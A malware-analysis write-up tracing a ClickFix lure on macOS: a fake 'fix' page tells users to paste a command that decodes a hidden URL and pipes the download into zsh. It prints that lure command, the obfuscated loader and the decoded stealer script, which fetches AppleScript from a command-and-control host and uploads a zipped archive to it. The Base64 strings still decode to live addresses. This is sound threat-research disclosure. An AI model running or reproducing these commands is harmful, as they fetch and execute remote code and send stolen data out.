## From ClickFix to MacSync: Execution Chain Analysis on macOS

ClickFix is a social-engineering technique that relies on convincing users to perform a manual action, typically pasting and executing a command under the guise of fixing a problem. It first gained wider attention in the wild through fake CAPTCHA and “verify you are human” pages, where users were instructed to copy and run commands to proceed. Since then, ClickFix has been reused across multiple campaigns as a lightweight initial access method.

This execution chain starts with the following domain, which is often the target from various malvertising domains:

Domain: hxxps[://]macfilearchive[.]com/s3/

<img width="1007" height="1069" alt="image" src="https://github.com/user-attachments/assets/dab21879-3c91-4020-9ba8-34872b43d6a5" />

This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it is referencing Apple's legitimate domain, but the full command is as follows:

```
echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ='|base64 -D)|zsh
```

A curl command is appended which executes a Base64 chunk, decoded to reveal:

```
hxxp[://]ballfrank[.]today/curl/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514
```

We can instead execute the following command to output the contents to a file, rather than executing it:

```
curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ=' | base64 -D) \
-o clickfix_payload.txt
```

This results in the following payload:

```
#!/bin/zsh
d23727=$(base64 -D <<'PAYLOAD_m317823069430411' | gunzip
H4sIAK23RWkAA+VUXW/TMBR976+4eNW0SSSx89l2lG1CgqFRDWlDTAJUOfZ1a9VxosSFbsB/J3RV
l5U+8YSEn6Jzj0/uPecmB8+CXNvgvpn3JMeitFO1tMLp0h4dw/cetAdXKOBFIPFrYJfGPGIv92Dh
DmhKwQ3IsuDajknOjVE1twvflZLfkQ7FlQtsGWFG0yRSgzRUFDFkUiDlcYrxgDIU4UDmsZQiy/JU
5XwYxSxneQuGwyEdioTFXUle6ekC78YkYUOKimVRxAYRp1KkkcrTMIqSTCWpTB8uaQWfoH8A3swB
hS8n4OZo15XfRyxrA94CvAY8r+Arz+kCIaLgXQD50GDtnc/QuhFMynttDA8Sn8LRhAttXdnMT+Ct
dWigBeDqGm6B0SlLptkxnFeVwY+YX2oXJFHmRykcXV7cTN49B6MXCG9QLMpjeDWvywKDIfOpH8dZ
6DMWwzVXvNaba2TdSju01w49gv5mfAJk7lw1CoL+QwyBvLO80OLUreS4v/b9sPrWPjICP6BseCNq
XbmHTE2D/4cFf86udGctTsGzuGctcKUdsC5/69ItvL+6voHPW+6/5NNOV3ss22EIMwL6FO3uAH1S
eQ1EaYPjs8AVVdDaasrZTNuZf68rssvMl9rIbhCd+m5uM+6Q/FUsdQGegj399H72Wq2dnx+Q/hmB
w0fRtSDtbb+HzQta8V/NI7r4QgUAAA==
PAYLOAD_m317823069430411
)
eval "$d23727"
```

The Base64 body can be transformed from base64 and gunzipped to reveal:

```
#!/bin/zsh
daemon_function() {
    exec </dev/null
    exec >/dev/null
    exec 2>/dev/null
    local domain="ballfrank[.]today"
    local token="270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
    local api_key="5190ef1733183a0dc63fb623357f56d6"
    if [ $# -gt 0 ]; then
        curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" -H "api-key: $api_key" "http://$domain/dynamic?txd=$token&pwd=$1" | osascript
    else
        curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" -H "api-key: $api_key" "http://$domain/dynamic?txd=$token" | osascript
    fi
    if [ $? -ne 0 ]; then
        exit 1
    fi
    curl -k -X POST \
         -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" \
         -H "api-key: $api_key" \
         -H "cl: 0" \
         --max-time 300 \
         -F "file=@/tmp/osalogging.zip" \
         -F "buildtxd=$token" \
         "http://$domain/gate"
    if [ $? -ne 0 ]; then
        exit 1
    fi
    rm -f /tmp/osalogging.zip
}
if daemon_function "$@" & then
    exit 0
else
    exit 1
fi
```
